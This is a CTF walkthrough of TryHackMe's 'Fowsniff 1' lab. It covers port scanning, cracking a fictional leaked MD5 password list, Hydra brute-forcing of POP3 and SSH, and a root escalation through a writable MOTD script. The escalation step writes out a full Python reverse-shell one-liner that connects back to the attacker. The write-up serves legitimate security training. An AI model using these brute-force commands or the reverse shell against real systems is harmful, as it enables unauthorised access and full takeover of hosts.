---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . Fowsniff 1
# DESCRIPTION       . Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners!
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/ctf
```

```
sudo nmap -sSVC -p- -T5 -oN fowsniff 10.10.106.143
```

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 903566f4c6d295121be8cddeaa4e0323 (RSA)
|   256 539d236734cf0ad55a9a1174bdfdde71 (ECDSA)
|_  256 a28fdbae9e3dc9e6a9ca03b1d71b6683 (ED25519)

80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Fowsniff Corp - Delivering Solutions
|_http-server-header: Apache/2.4.18 (Ubuntu)

110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: PIPELINING SASL(PLAIN) RESP-CODES TOP AUTH-RESP-CODE USER CAPA UIDL

143/tcp open  imap    Dovecot imapd
|_imap-capabilities: OK LITERAL+ more ENABLE IMAP4rev1 SASL-IR ID post-login listed capabilities AUTH=PLAINA0001 LOGIN-REFERRALS have IDLE Pre-login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- `robots.txt` doesn't reveal anything interesting, but since we're already here, let's check the webpage  too.

```
**Client information was not affected.**

Due to the strong possibility that employee information has been made publicly available, all employees have been instructed to change their passwords immediately.

The attackers were also able to hijack our official @fowsniffcorp Twitter account. All of our official tweets have been deleted and the attackers may release sensitive information via this medium. We are working to resolve this at soon as possible.

We will return to full capacity after a service upgrade.
```

- So I headed to Twitter and looked for user `@fowsniffcorp` - [link](https://twitter.com/fowsniffcorp)

- On his profile, we're able to find a link to pastebin with the following content

```
FOWSNIFF CORP PASSWORD LEAK
            ''~``
           ( o o )
+-----.oooO--(_)--Oooo.------+
|                            |
|          FOWSNIFF          |
|            got             |
|           PWN3D!!!         |
|                            |         
|       .oooO                |         
|        (   )   Oooo.       |         
+---------\ (----(   )-------+
           \_)    ) /
                 (_/
FowSniff Corp got pwn3d by B1gN1nj4!
No one is safe from my 1337 skillz!
 
 
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
 
Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!
 
Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!
 
MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P
 
l8r n00bz!
 
B1gN1nj4

-------------------------------------------------------------------------------------------------
This list is entirely fictional and is part of a Capture the Flag educational challenge.

--- THIS IS NOT A REAL PASSWORD LEAK ---
 
All information contained within is invented solely for this purpose and does not correspond
to any real persons or organizations.
 
Any similarities to actual people or entities is purely coincidental and occurred accidentally.

-------------------------------------------------------------------------------------------------
```

- So we got our credentials plus some extra hints: we're alreadty told that the hashes are MD5. We're also hinted that we might need to try these on the `POP3 server`, as this is exposed. 

- Using [crackstation](https://crackstation.net/) I was able to crack almost all hashes.

```
mauer@fowsniff:{redacted}ll
mustikka@fowsniff:{redacted}01
tegel@fowsniff:{redacted}01
baksteen@fowsniff:{redacted}22
seina@fowsniff:{redacted}o2
stone@fowsniff:Not found.
mursten@fowsniff:c{redacted}er
parede@fowsniff:{redacted}12
sciana@fowsniff:{redacted}72
```

- Alright. I decided to do a banner grabing on the POP3 server before attempting anything else.

```
nc -nv <IP> 110

Connection to 10.10.106.143 110 port [tcp/*] succeeded!
+OK Welcome to the Fowsniff Corporate Mail Server!
```

- Yes, the server is open. I tried the first username with the according password but it failed.
- So I have created two files, one with usernames and one with the passwords.
- Then, I have used `Hydra` to bruteforce the service.

```
hydra -L users.txt -P pass.txt 10.10.106.143 pop3 -I -t 4
```

```
[110][pop3] host: 10.10.106.143   login: seina   password: {redacted}
```

- After a while, it seems that `seina` is the user that still has access to the mail server.

```
nc -nv 10.10.106.143 110

Connection to 10.10.106.143 110 port [tcp/*] succeeded!
+OK Welcome to the Fowsniff Corporate Mail Server!

USER seina
+OK
PASS {redacted}
+OK Logged in.
LIST
+OK 2 messages:
1 1622
2 1280

RETR 1
```

- A temporary SSH password is found in the first email.

```
The temporary password for SSH is "S{redactedll"
```

- I tried SSHing with the same as seina but I failed. I replaced the content of `pass.txt` with the password found in the email and then I've used hydra to bruteforce the SSH service.

```
hydra -L users.txt -P pass.txt 10.10.106.143 ssh -t 4 -I
```

```
[22][ssh] host: 10.10.106.143   login: baksteen   password: S{redacted}l
```

- `sudo -l` doesn't bring happy news but a simple `id` does: Our user belongs to multiple groups.

```
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
```

- This is not the default behaviour; I was curios to see if there are any files owned by this group

```
find / -group users 2>/dev/null | grep -v /proc | grep -v /sys
```

```
/opt/cube/cube.sh
/run/user/1004
/home/baksteen/.cache
/home/baksteen/.cache/motd.legal-displayed
/home/baksteen/Maildir
/home/baksteen/Maildir/tmp
/home/baksteen/Maildir/dovecot-uidvalidity
/home/baksteen/Maildir/dovecot.index.log
/home/baksteen/Maildir/cur
/home/baksteen/Maildir/new
/home/baksteen/Maildir/new/1520967067.V801I23764M196461.fowsniff
/home/baksteen/Maildir/dovecot-uidlist
/home/baksteen/Maildir/dovecot-uidvalidity.5aa21fac
/home/baksteen/.viminfo
/home/baksteen/.bash_history
/home/baksteen/.bash_logout
/home/baksteen/.lesshst
/home/baksteen/term.txt
/home/baksteen/.profile
```

- Nothing interesting except `/opt/cube/cube.sh`. Let's see what's that.

```
cat /opt/cube/cube.sh 

printf "
                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions\n\n"
```

```bash
baksteen@fowsniff:~$ ls -l /opt/cube/cube.sh 
-rw-rwxr-- 1 parede users 851 Mar 11  2018 /opt/cube/cube.sh
```

- Alright, so it's just a motd sort of thing. But it is owned by the `users` group, so we can edit it.

- By the way, this is the same MOTD displayed when we logged on the server. Let's investigate to see how it gets triggered.

- Inside the `/etc/update-motd.d` directory, we have multiple files.

- `00-header` file is owned by `root` and calls for `sh /opt/cube/cube.sh` - our script.

- Let's change its content to a reverse shell and then relog to SSH to trigger it.

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

- After reconnecting to the server, we should catch a reverse shell with our listener.

```
# whoami
root
```

- The flag is in `/root/flag.txt`.

